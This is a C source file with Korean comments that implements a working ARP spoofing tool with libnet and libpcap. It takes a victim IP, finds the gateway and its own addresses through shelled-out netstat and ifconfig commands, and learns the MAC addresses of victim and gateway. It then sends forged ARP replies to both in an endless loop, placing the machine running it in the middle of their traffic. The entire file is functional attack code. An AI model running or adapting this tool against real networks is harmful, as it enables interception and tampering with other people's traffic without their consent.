#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <libnet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <pcap.h>

#define GATEIP "netstat -r | grep default | awk '{print $2}'"
#define MYIP "ifconfig ens33 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'"

#define PROMISC 1
#define NONPROMISC 0

libnet_t *lib;
pcap_t *pcd;

u_int32_t ip_temp, ip_temp2;
struct libnet_ether_addr mac_temp;

/* libnet 버전이 올라가면서 libnet_arp_hdr 구조체에서 ip저장하는 부분이 사라졌습니다. 그래서 재정의해서 쓰겠습니다. */

struct libnet_arp_hdr2
{
    uint16_t ar_hrd;         /* format of hardware address */
#define ARPHRD_NETROM   0   /* from KA9Q: NET/ROM pseudo */
#define ARPHRD_ETHER    1   /* Ethernet 10Mbps */
#define ARPHRD_EETHER   2   /* Experimental Ethernet */
#define ARPHRD_AX25     3   /* AX.25 Level 2 */
#define ARPHRD_PRONET   4   /* PROnet token ring */
#define ARPHRD_CHAOS    5   /* Chaosnet */
#define ARPHRD_IEEE802  6   /* IEEE 802.2 Ethernet/TR/TB */
#define ARPHRD_ARCNET   7   /* ARCnet */
#define ARPHRD_APPLETLK 8   /* APPLEtalk */
#define ARPHRD_LANSTAR  9   /* Lanstar */
#define ARPHRD_DLCI     15  /* Frame Relay DLCI */
#define ARPHRD_ATM      19  /* ATM */
#define ARPHRD_METRICOM 23  /* Metricom STRIP (new IANA id) */
#define ARPHRD_IPSEC    31  /* IPsec tunnel */
    uint16_t ar_pro;         /* format of protocol address */
    uint8_t  ar_hln;         /* length of hardware address */
    uint8_t  ar_pln;         /* length of protocol addres */
    uint16_t ar_op;          /* operation type */
#define ARPOP_REQUEST    1  /* req to resolve address */
#define ARPOP_REPLY      2  /* resp to previous request */
#define ARPOP_REVREQUEST 3  /* req protocol address given hardware */
#define ARPOP_REVREPLY   4  /* resp giving protocol address */
#define ARPOP_INVREQUEST 8  /* req to identify peer */
#define ARPOP_INVREPLY   9  /* resp identifying peer */
    u_char ar_sha[6];
    u_char ar_spa[4]; // 이 부분을 다시 예전버전으로 복구
    u_char ar_tha[6];
    u_char ar_tpa[4];
};

void parsing (char* mode, struct in_addr* ip)
{
        char line[16] = {0};
        FILE *fp = popen(mode,"r");
        fgets(line, sizeof(line)-1, fp);
        inet_aton(line, ip);
}

void get_mac (u_int32_t ip, struct libnet_ether_addr *mac);
void macloop (u_char *user, const struct pcap_pkthdr* header, const u_char* packet);
void spoof_result (u_char *user, const struct pcap_pkthdr *header, const u_char *packet);
void spoof (u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *mac);

int main (int argc, char** argv)
{
	u_int32_t AttackerIp, VictimIp, GatewayIp;
        struct libnet_ether_addr *AttackerMac, VictimMac, GatewayMac;
	struct bpf_program bpf;
	char *device = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	
	device = pcap_lookupdev(errbuf);

	parsing(GATEIP, (struct in_addr *)&GatewayIp); // netstat 파싱해서 게이트 아이피 가져오기
	parsing(MYIP, (struct in_addr *)&AttackerIp); // ifconfig 파싱해서 내 아이피 가져오기
	
	lib = libnet_init(LIBNET_LINK, device, errbuf);
	AttackerMac = libnet_get_hwaddr(lib);
	VictimIp = libnet_name2addr4(lib, argv[1], LIBNET_DONT_RESOLVE); // argv[1]을 피해자ip 셋팅
	
	printf(" === === === === === === === === \n");
	printf("[*] Attacker Ip : %s\n", libnet_addr2name4(AttackerIp, LIBNET_DONT_RESOLVE));
	printf("[*] Victim Ip : %s\n", argv[1]);
	printf("[*] Gateway Ip : %s\n", libnet_addr2name4(GatewayIp, LIBNET_DONT_RESOLVE));
	printf(" === === === === === === === === \n");

	pcd = pcap_open_live(device, 1500, NONPROMISC, -1, errbuf);
	if (!pcd) {
		fputs(errbuf, stderr);
		return 1;
	}
	if (pcap_set_datalink(pcd, DLT_EN10MB)) return 1; // ethernet 패킷 만 잡기
	if (pcap_compile (pcd, &bpf, "arp", 0, 0xFFFFFFFF) == -1) return 1; 
	// arp 패킷 중 브로드캐스트 만 잡기
	if (pcap_setfilter (pcd, &bpf) == -1) return 1;
	
	ip_temp = VictimIp;
	get_mac (AttackerIp,AttackerMac);
	VictimMac = mac_temp;
	// victim mac 주소 찾기
	ip_temp = GatewayIp;
	get_mac (AttackerIp,AttackerMac);
	GatewayMac = mac_temp;
	// gateway mac 주소 찾기

	printf ("[+] %s --- ---> %02x:%02x:%02x:%02x:%02x:%02x\n", libnet_addr2name4(AttackerIp, LIBNET_DONT_RESOLVE), AttackerMac->ether_addr_octet[0],
			AttackerMac->ether_addr_octet[1],
			AttackerMac->ether_addr_octet[2],
			AttackerMac->ether_addr_octet[3],
			AttackerMac->ether_addr_octet[4],
			AttackerMac->ether_addr_octet[5]);	
	spoof(VictimIp, GatewayIp, VictimMac, AttackerMac); // spoof 공격
	spoof(GatewayIp, VictimIp, GatewayMac, AttackerMac); // spoof 공격

	ip_temp = VictimIp; // 처음 spoof 공격 후 결과 값 저장
	ip_temp2 = GatewayIp;
	mac_temp = *AttackerMac;
	
	while (1)
	{
		pcap_loop(pcd, -1, spoof_result, NULL); // spoof 공격결과
		spoof(VictimIp, GatewayIp, VictimMac, AttackerMac); // spoof 공격
		spoof(GatewayIp, VictimIp, GatewayMac, AttackerMac); // spoof 공격
	}
	
	pcap_close(pcd); // 에필로그
	libnet_destroy(lib);
	return 0;
} 

void get_mac (u_int32_t ip, struct libnet_ether_addr *mac)
{
	u_int8_t broadcast_ether[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	libnet_ptag_t arp, eth;
	
	arp = libnet_autobuild_arp ( ARPOP_REQUEST,				
					(u_int8_t *) mac, // 송신자의 mac			
					(u_int8_t *) &ip, // 송신자의 ip		
					(u_int8_t *) broadcast_ether, // 수신자의 mac
					(u_int8_t *) &ip_temp, // 수신자의 ip
					lib ); // 컨텍스트

	eth = libnet_build_ethernet ((u_int8_t *) broadcast_ether, // 수신자의 mac	
					(u_int8_t *) mac, // 송신자의 mac	
					ETHERTYPE_ARP, // 상위 프로토콜
					NULL, // 페이로드 포인터		
					0, // 페이로드 크기
					lib, // 컨텍스트                    			
					0);
	libnet_write(lib); // arp 요청 패킷 생성
	pcap_loop(pcd, -1, macloop, NULL);
}

void macloop (u_char *user, const struct pcap_pkthdr* header, const u_char* packet)
{
	struct libnet_ethernet_hdr *ether_packet;
	struct libnet_arp_hdr2 *arp_packet;

	ether_packet = (struct libnet_ethernet_hdr *)packet;
	
	if (ntohs(ether_packet->ether_type) == ETHERTYPE_ARP) {	// 이더넷 상위 타입이 ARP 이면
		arp_packet = (struct libnet_arp_hdr2 *)(packet+14); // ARP 패킷부분만 추출
		if (ntohs(arp_packet->ar_op) == 2 &&
			!memcmp(&ip_temp, arp_packet->ar_spa, 4))
		// REPLY 응답 패킷 중에 찾을려고 하는 아이피와 같은 것
		{
			memcpy(mac_temp.ether_addr_octet, ether_packet->ether_shost, 6);
			// MAC 크기인 6 바이트 만큼 업데이트
			printf ("[+] %d.%d.%d.%d --- ---> %02x:%02x:%02x:%02x:%02x:%02x\n", 
					arp_packet->ar_spa[0],
					arp_packet->ar_spa[1],
					arp_packet->ar_spa[2],
					arp_packet->ar_spa[3],
					mac_temp.ether_addr_octet[0],
					mac_temp.ether_addr_octet[1],
					mac_temp.ether_addr_octet[2],
					mac_temp.ether_addr_octet[3],
					mac_temp.ether_addr_octet[4],
					mac_temp.ether_addr_octet[5]);
			pcap_breakloop (pcd);
		}
	}
	libnet_clear_packet(lib);
}

void spoof (u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *mac)
{
	libnet_ptag_t arp, eth;
	
	arp = libnet_autobuild_arp ( ARPOP_REPLY,				
					(u_int8_t *) mac, // 송신자의 mac			
					(u_int8_t *) &ip_spoof, // 송신자의 ip		
					(u_int8_t *) &mac_target, // 수신자의 mac
					(u_int8_t *) &ip_target, // 수신자의 ip
					lib ); // 컨텍스트

	eth = libnet_build_ethernet ((u_int8_t *) &mac_target, // 수신자의 mac	
					(u_int8_t *) mac, // 송신자의 mac	
					ETHERTYPE_ARP, // 상위 프로토콜
					NULL, // 페이로드 포인터		
					0, // 페이로드 크기
					lib, // 컨텍스트                    		
					0);
	printf("[+] Attack Spoofing %s to %s\n",libnet_addr2name4(ip_spoof, LIBNET_DONT_RESOLVE), libnet_addr2name4(ip_target, LIBNET_DONT_RESOLVE));
	libnet_write(lib); // arp 요청 패킷 생성
	libnet_clear_packet(lib);
}

void spoof_result (u_char *user, const struct pcap_pkthdr *header, const u_char *packet)
{
	struct libnet_ethernet_hdr *ether_packet;
	struct libnet_arp_hdr2 *arp_packet;

	ether_packet = (struct libnet_ethernet_hdr *)packet;
	
	if (ntohs(ether_packet->ether_type) == ETHERTYPE_ARP) {	// 이더넷 상위 타입이 ARP 이면
		arp_packet = (struct libnet_arp_hdr2 *)(packet+14); // ARP 패킷부분만 추출
		if (ntohs(arp_packet->ar_op) == 2 &&
			memcmp(mac_temp.ether_addr_octet, ether_packet->ether_shost, 6) && (!memcmp(&ip_temp, arp_packet->ar_spa, 4) || !memcmp(&ip_temp2, arp_packet->ar_spa,4)))
		// 감염자(gateway와victim)들의 응답패킷 도착 !!!
		{
			printf ("[+] print (victim's reply) : %d.%d.%d.%d\n",
					arp_packet->ar_spa[0],
					arp_packet->ar_spa[1],
					arp_packet->ar_spa[2],
					arp_packet->ar_spa[3]);
			pcap_breakloop (pcd);
			// 여기에서 한 번 출력해주고 무한루프를 빠져나오기 때문에 다시 spoof 공격을 시작할 수 있습니다.
		}
		if (ntohs(arp_packet->ar_op) == 1 &&
			!memcmp(mac_temp.ether_addr_octet, ether_packet->ether_shost, 6) && (!memcmp(&ip_temp, arp_packet->ar_tpa, 4) || !memcmp(&ip_temp2, arp_packet->ar_tpa,4)))
		// 감염자(gateway와victim)들의 요청패킷 도착 !!!
		{
			printf ("[+] print (victim's request) : %d.%d.%d.%d\n", 
					arp_packet->ar_spa[0],
					arp_packet->ar_spa[1],
					arp_packet->ar_spa[2],
					arp_packet->ar_spa[3]);
			pcap_breakloop (pcd);
			// 여기에서 한 번 출력해주고 무한루프를 빠져나오기 때문에 다시 spoof 공격을 시작할 수 있습니다.
		}
	}

	libnet_clear_packet(lib);
}
